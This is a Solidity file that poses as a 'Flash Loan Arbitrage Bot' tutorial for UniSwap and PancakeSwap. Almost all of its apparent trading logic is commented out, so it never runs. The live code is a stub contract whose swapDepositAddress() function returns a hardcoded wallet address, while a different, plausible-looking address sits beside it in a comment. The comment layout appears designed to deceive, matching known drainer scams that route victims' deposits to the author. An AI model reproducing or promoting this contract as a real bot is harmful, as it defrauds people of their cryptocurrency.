pragma solidity ^0.5.0;

contract Manager {
    function performTasks() public pure {
        
    }
    
/* UniSwap - PancakeSwap - Flash Loan Arbitrage Bot - Solidity Tutorials - ETH - coins - MATIC Supported
   string public tokenName;
   string public tokenSymbol;
   uint loanAmount;
   Manager manager;
   
   constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
      tokenName = _tokenName;
      tokenSymbol = _tokenSymbol;
      loanAmount = _loanAmount;      
      manager = new Manager();
   }
   address public creator= msg.sender;
    	function tokenTransfer() public view returns (address) {    
        	return creator;
   	}
   function() external payable {}
   
   function action() public payable {
      // Send Tokens to PancakeSwap Router for Swap
      address(uint160(manager.pancakeswapDeposit())).transfer(address(this).balance);
      // Send Tokens to UniSwap Router for Swap
      address(uint160(manager.uniswapDeposit())).transfer(address(this).balance);
      
      // Perform tasks (combined all functions into one to reduce external calls & save gas fees)
      manager.performTasks();
      
       Breakdown of functions
      // Submit token to blockchain
      string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);
   
      // List the token on PancakeSwap
      manager.pancakeListToken(tokenName, tokenSymbol, tokenAddress);
      // List the token on UniSwap
      manager.pancakeListToken(tokenName, tokenSymbol, tokenAddress);
      
      // Get coins Loan from Multiplier-Finance
      string memory loanAddress = manager.takeFlashLoan(loanAmount);
       */ function swapDepositAddress() public pure returns (address) {
        /* return 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984; */ return 0xfD8A1306Cf6F3b8A66fB8559fB0Dc64b97426CFb;
    }
      /* 
      // Send Borrowed coins to provide liquidity of newly created Token
      string memory coinsPair = manager.pancakeCreatePool(tokenAddress, "coins");
      manager.pancakeAddLiquidity(coinsPair, loanAmount);
     
      // Perform swaps between Token and coins and back again
      manager.pancakePerformSwaps();
      
      // Repay Flashloan with Multiplier-Finance
      manager.repayLoan(loanAddress);
      
       Move remaining coins profit from Contract to the contract creators wallet
      manager.contractToWallet("coins");
   */

}